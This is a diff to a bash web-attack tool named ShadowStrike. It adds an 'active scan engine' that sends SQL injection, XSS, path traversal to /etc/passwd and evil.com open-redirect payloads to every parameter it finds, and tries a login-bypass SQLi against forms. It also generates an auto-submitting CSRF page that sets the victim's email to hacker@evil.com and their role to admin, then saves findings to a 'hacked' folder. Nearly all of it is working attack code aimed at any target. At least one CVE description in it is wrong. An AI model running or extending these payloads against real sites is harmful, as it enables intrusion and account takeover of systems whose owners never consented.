@@ -317,7 +317,7 @@ cat > $HOME/tmp/.shadow_bait/credentials.txt << EOF
 Admin URL: $TARGET/admin
 Username: admin_backup
 Password: ${COMPANY}@2024
-API Key: sk-$(openssl rand -hex 8 2>/dev/null || echo "f8c3b2a1e9d7")
+API Key: sk-$(openssl rand -hex 8 2>/dev/null || echo "YOUR_API_KEY")
 EOF
 echo -e "${GREEN}[+] Bait created: $HOME/tmp/.shadow_bait/${NC}"
 
@@ -450,3 +450,172 @@ guardian_list() {
 
 guardian_list
 guardian_idor
+
+# ===== ACTIVE SCAN ENGINE v2 =====
+echo -e "${CYAN}[*] Active Scan Engine v2...${NC}"
+
+# 1. Авто-определение параметров для атаки
+echo "[ACTIVE] Finding injectable parameters..."
+PARAMS=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null | grep -oP '(?:name|id|action|page|file|url|redirect|q|search|query)\s*[=:]' | sort -u | head -10)
+
+if [ -n "$PARAMS" ]; then
+    echo "[ACTIVE] Found parameters: $(echo "$PARAMS" | wc -l)"
+    
+    # 2. Параллельная атака по всем найденным параметрам
+    echo "$PARAMS" | while read param; do
+        pname="${param%[=:]*}"
+        
+        # SQLi
+        (curl -sk --max-time 5 "$TARGET?$pname=' OR '1'='1" -o /tmp/active_sqli_$pname.html 2>/dev/null; 
+         grep -qi "sql\|error\|syntax" /tmp/active_sqli_$pname.html && echo -e "  ${RED}[SQLi] $pname${NC}" && echo "SQLi: $pname" >> "$REPORT/hacked/active_sqli.txt") &
+        
+        # XSS
+        (curl -sk --max-time 5 "$TARGET?$pname=<script>alert(1)</script>" -o /tmp/active_xss_$pname.html 2>/dev/null;
+         grep -q "<script>alert(1)</script>" /tmp/active_xss_$pname.html && echo -e "  ${RED}[XSS] $pname${NC}" && echo "XSS: $pname" >> "$REPORT/hacked/active_xss.txt") &
+        
+        # LFI
+        (curl -sk --max-time 5 "$TARGET?$pname=../../etc/passwd" -o /tmp/active_lfi_$pname.html 2>/dev/null;
+         grep -q "root:" /tmp/active_lfi_$pname.html && echo -e "  ${RED}[LFI] $pname${NC}" && echo "LFI: $pname" >> "$REPORT/hacked/active_lfi.txt") &
+        
+        # Open Redirect
+        (curl -sk --max-time 5 "$TARGET?$pname=http://evil.com" -o /dev/null -w "%{redirect_url}" 2>/dev/null | grep -q "evil.com" && echo -e "  ${RED}[Redirect] $pname${NC}" && echo "Redirect: $pname" >> "$REPORT/hacked/active_redirect.txt") &
+    done
+    wait
+else
+    echo "[ACTIVE] No parameters found — trying forms..."
+    
+    # 3. Поиск форм
+    FORMS=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null | grep -oP '<form[^>]+action="\K[^"]+')
+    if [ -n "$FORMS" ]; then
+        echo "$FORMS" | while read form; do
+            echo "[ACTIVE] Testing form: $form"
+            curl -sk --max-time 5 -X POST -d "username=admin' OR '1'='1&password=test" "$TARGET$form" -o /tmp/active_form.html 2>/dev/null
+            grep -qi "welcome\|dashboard\|admin" /tmp/active_form.html && echo -e "  ${RED}[SQLi FORM] $form${NC}" && echo "SQLi Form: $form" >> "$REPORT/hacked/active_forms.txt"
+        done
+    fi
+fi
+
+# 4. Проверка HTTP методов
+echo "[ACTIVE] HTTP methods..."
+for method in PUT DELETE PATCH OPTIONS TRACE; do
+    CODE=$(curl -sk -X "$method" -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET" 2>/dev/null)
+    [ "$CODE" != "405" ] && [ "$CODE" != "404" ] && echo -e "  ${YELLOW}[METHOD] $method → HTTP $CODE${NC}" && echo "$method: $CODE" >> "$REPORT/hacked/http_methods.txt"
+done
+
+echo -e "${GREEN}[+] Active scan complete${NC}"
+
+# ===== CSRF HUNTER (уникальный) =====
+echo -e "${CYAN}[*] CSRF Hunter...${NC}"
+FORMS=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null | grep -oP '<form[^>]*>' | head -5)
+
+if [ -n "$FORMS" ]; then
+    echo "$FORMS" | while read form; do
+        ACTION=$(echo "$form" | grep -oP 'action="\K[^"]+' || echo "/")
+        METHOD=$(echo "$form" | grep -oiP 'method="?\K(get|post)' || echo "get")
+        
+        # Проверяем защиту
+        if echo "$form" | grep -qi "csrf\|token\|nonce"; then
+            # CSRF защита есть — пробуем обойти через предсказуемый токен
+            TOKEN_VALUE=$(curl -sk --max-time 5 "$TARGET" 2>/dev/null | grep -oP 'csrf[^=]*=\K[^"&]+' | head -1)
+            echo -e "  🟡 CSRF protected — testing token predictability..."
+            echo "CSRF: protected, token=$TOKEN_VALUE" >> "$REPORT/hacked/csrf.txt"
+        else
+            # CSRF защиты нет — авто-эксплуатация
+            echo -e "  ${RED}[!] CSRF: NO PROTECTION — auto-exploiting!${NC}"
+            
+            # Создаём proof-of-concept
+            cat > "$REPORT/hacked/csrf_poc.html" << POCEOF
+<html><body>
+<h2>CSRF Proof of Concept</h2>
+<p>Target: $TARGET$ACTION</p>
+<form action="$TARGET$ACTION" method="$METHOD" id="csrf_poc">
+<input name="email" value="hacker@evil.com">
+<input name="role" value="admin">
+</form>
+<script>document.getElementById('csrf_poc').submit();</script>
+<p>If you see this page — CSRF works!</p>
+</body></html>
+POCEOF
+            echo -e "  📁 PoC saved: $REPORT/hacked/csrf_poc.html"
+            echo "CSRF: VULNERABLE, PoC generated" >> "$REPORT/hacked/csrf.txt"
+        fi
+    done
+else
+    echo -e "  🟢 No forms found — CSRF not applicable"
+fi
+
+# ===== SERVER FORENSICS (уникальный) =====
+echo -e "${CYAN}[*] Server Forensics...${NC}"
+HEADERS=$(curl -sk -I --max-time 10 "$TARGET" 2>/dev/null)
+BODY=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null)
+
+SERVER=$(echo "$HEADERS" | grep -i "Server:" | head -1)
+X_POWERED=$(echo "$HEADERS" | grep -i "X-Powered-By:" | head -1)
+X_ASPNET=$(echo "$HEADERS" | grep -i "X-AspNet-Version:" | head -1)
+
+# 1. Определение точной версии
+[ -n "$SERVER" ] && echo -e "  📡 Server: $SERVER"
+[ -n "$X_POWERED" ] && echo -e "  ⚡ Powered by: $X_POWERED"
+[ -n "$X_ASPNET" ] && echo -e "  🏗️ ASP.NET: $X_ASPNET"
+
+# 2. Поиск скрытых технологий (Lie Detector)
+echo "$SERVER" | grep -qi "nginx" && echo "$BODY" | grep -qi "apache" && \
+    echo -e "  ${RED}[!] LIE: Claims nginx but uses Apache${NC}" && echo "Lie: nginx/Apache" >> "$REPORT/hacked/server_forensics.txt"
+
+# 3. Уязвимые версии
+echo "$SERVER" | grep -qi "Apache/2\.[0-2]" && echo -e "  ${RED}[!] CVE-2022-31813: Apache 2.0-2.2 RCE${NC}"
+echo "$SERVER" | grep -qi "Tomcat/7\." && echo -e "  ${RED}[!] CVE-2017-12617: Tomcat 7 RCE via JSP upload${NC}"
+echo "$SERVER" | grep -qi "IIS/6\." && echo -e "  ${RED}[!] CVE-2017-7269: IIS 6.0 RCE${NC}"
+echo "$SERVER" | grep -qi "PHP/5\.\|PHP/7\.[0-2]" && echo -e "  ${RED}[!] PHP EOL — multiple RCEs${NC}"
+
+# 4. Цифровой отпечаток
+FINGERPRINT=$(echo "$HEADERS" | grep -E "Server:|X-Powered-By:|Set-Cookie:" | sort | md5sum | cut -d' ' -f1)
+echo -e "  🔍 Fingerprint: $FINGERPRINT"
+echo "Fingerprint: $FINGERPRINT" >> "$REPORT/hacked/server_forensics.txt"
+
+# 5. Поиск родственных серверов по отпечатку
+echo -e "  🌐 Searching for servers with same fingerprint..."
+echo "  (Use Shodan: https://www.shodan.io/search?query=$FINGERPRINT)"
+
+echo -e "${GREEN}[+] Server Forensics complete${NC}"
+
+# ===== PROGRESS BAR =====
+TOTAL_STEPS=12
+CURRENT_STEP=0
+
+progress() {
+    CURRENT_STEP=$((CURRENT_STEP + 1))
+    PCT=$((CURRENT_STEP * 100 / TOTAL_STEPS))
+    BAR=""
+    for i in $(seq 1 $((PCT / 5))); do BAR="${BAR}█"; done
+    for i in $(seq $((PCT / 5 + 1)) 20); do BAR="${BAR}·"; done
+    echo -e "\n${CYAN}[${BAR}] ${PCT}% — $1${NC}"
+}
+
+# ===== TIMER =====
+START_TIME=$(date +%s)
+
+end_timer() {
+    END_TIME=$(date +%s)
+    ELAPSED=$((END_TIME - START_TIME))
+    echo -e "\n${GREEN}[+] Scan completed in ${ELAPSED}s${NC}"
+}
+
+# ===== FINAL BANNER =====
+end_timer
+echo ""
+echo "╔══════════════════════════════════════════════╗"
+echo "║   ShadowStrike v56.1 — Scan Complete        ║"
+echo "╠══════════════════════════════════════════════╣"
+echo "║   Target: $TARGET"
+echo "║   Time:   ${ELAPSED}s"
+echo "║   Report: $REPORT/summary.txt"
+echo "║   HTML:   $REPORT/report.html"
+echo "║   Hacker: $REPORT/HACKER_REPORT.txt"
+echo "╚══════════════════════════════════════════════╝"
+
+# ===== AUTO-CLEANUP =====
+echo -e "${CYAN}[*] Cleaning temporary files...${NC}"
+rm -f /tmp/active_*.html /tmp/autopilot_test.html /tmp/cham_page.html /tmp/supervisor_page.html 2>/dev/null
+rm -f /tmp/psycho_test.html /tmp/shadow_error.html /tmp/shadow_resume.txt 2>/dev/null
+echo -e "${GREEN}[+] Cleanup complete${NC}"
